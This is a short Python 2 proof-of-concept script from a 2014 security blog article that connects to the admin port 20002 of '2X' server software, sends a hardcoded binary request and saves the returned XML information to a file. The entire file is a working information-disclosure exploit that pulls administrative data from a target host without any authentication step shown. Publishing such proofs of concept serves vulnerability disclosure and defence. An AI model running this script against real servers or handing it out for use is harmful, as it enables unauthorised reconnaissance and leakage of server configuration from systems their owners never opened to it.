#Copyright (c) 2014 "NICOLAS GOLLET/NGINFO"
#Nicolas GOLLET <ng [AT] nginfo.fr>
#
#This file is part of "blog.ng.pe" blog article.
#
#This is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os, sys
import struct
import array
import socket
from struct import *
from optparse import OptionParser


def main():
    print >>sys.stderr,  "Get Info from 2X 20002 Admin port (PoC)"
    print >>sys.stderr,  "coded by Nicolas GOLLET (blog.ng.pe)"
    parser = OptionParser()
    parser.add_option("-d", "--destination", dest="hostname", help="Destination hostname or IP", metavar="HOSTNAME")
    parser.add_option("-f", "--file", dest="filename", help="write report to FILE", metavar="FILE")
    (options, args) = parser.parse_args()
    if not options.filename:   # if filename is not given
        parser.error('Filename not given')
    if not options.hostname:   # if filename is not given
        parser.error('Hostname not given')
    SERVER = options.hostname;
    OUTPUTXML = options.filename;
    TCP_PORT  = 20002
    # Data to get information from 2X
    GETINFOMSG = "\x01\x00\x58\x32\x02\x00\x00\x00\x12\x00\x00\x00\x10\x00\x00\x00"
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    server_address = (SERVER, TCP_PORT)
    print >>sys.stderr, 'connecting to %s port %s' % server_address
    sock.connect(server_address)
    try:
        print >>sys.stderr, '>> sending "%s"' % GETINFOMSG.encode("hex")
        sock.sendall(GETINFOMSG)
        amount_received = 0
        amount_expected = len(GETINFOMSG)
        
        print >>sys.stderr, '<< Get 2X Header '
        dataheader = sock.recv(24)
        data_size = []
        data_size[:0] = dataheader[12:16]
        s = ''.join(data_size[::-1])
        num = struct.unpack(">L", s)[0]
        print >>sys.stderr, '<<datasize =  "%i" bytes'  % num
        xml_data = ''
        while (amount_received + 25) <= num:
                data = sock.recv(1024)
                amount_received += len(data)
                print >>sys.stderr, '<<received "%s" \n' % data
                xml_data += (data)

        # Save to file
        file = open(OUTPUTXML, "w")
        # quick unicode replace char
        file.write(xml_data.replace('\x00', ''))
        print >>sys.stderr, 'XML Data file saved to %s' % OUTPUTXML
        file.close()
                
    finally:
        print >>sys.stderr, 'closing socket'
        sock.close()  


if __name__ == '__main__':
    main()
